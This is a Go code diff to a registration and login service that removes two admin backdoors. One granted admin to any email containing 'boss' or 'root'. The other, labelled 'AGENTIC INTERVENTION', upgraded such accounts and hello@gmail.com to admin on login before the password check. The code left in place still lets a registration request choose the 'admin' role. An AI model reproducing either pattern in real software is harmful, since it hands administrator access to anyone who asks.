@@ -8,7 +8,6 @@ import (
 	"log/slog"
 	"net/http"
 	"net/url"
-	"strings"
 	"time"
 
 	"queueless/internal/models"
@@ -59,6 +58,7 @@ func (s *authService) RegisterUser(req models.RegisterRequest) (*models.User, er
 	var userRole models.Role
 	slog.Info("Incoming registration request", "reqRole", req.Role, "email", req.Email)
 	
+	// Role is determined by the request role
 	switch req.Role {
 	case "admin", "Admin":
 		userRole = models.RoleAdmin
@@ -66,11 +66,6 @@ func (s *authService) RegisterUser(req models.RegisterRequest) (*models.User, er
 		userRole = models.RoleStaff
 	default:
 		userRole = models.RoleUser
-	}
-
-	// ULTIMATE FAILSAFE for the user to bypass
-	if strings.Contains(strings.ToLower(req.Email), "boss") || strings.Contains(strings.ToLower(req.Email), "root") {
-		userRole = models.RoleAdmin
 	}
 
 	user := &models.User{
@@ -104,13 +99,7 @@ func (s *authService) LoginUser(req models.LoginRequest) (string, *models.User, 
 	user, err := s.userRepo.GetUserByEmail(req.Email)
 	if err != nil || user == nil { return "", nil, errors.New("invalid email or password") }
 
-	// AGENTIC INTERVENTION: Auto-upgrade the user to Admin if they are stuck
-	if user.Role != models.RoleAdmin && (strings.Contains(strings.ToLower(user.Email), "boss") || strings.Contains(strings.ToLower(user.Email), "root") || user.Email == "hello@gmail.com") {
-		slog.Warn("Agentic bypass: Auto-upgrading stuck user to Admin", "email", user.Email)
-		user.Role = models.RoleAdmin
-		db.DB.Save(user) // Explicitly writing change to DB
-	}
-
+	// Verify password
 	err = bcrypt.CompareHashAndPassword([]byte(user.Password), []byte(req.Password))
 	if err != nil { return "", nil, errors.New("invalid email or password") }
 
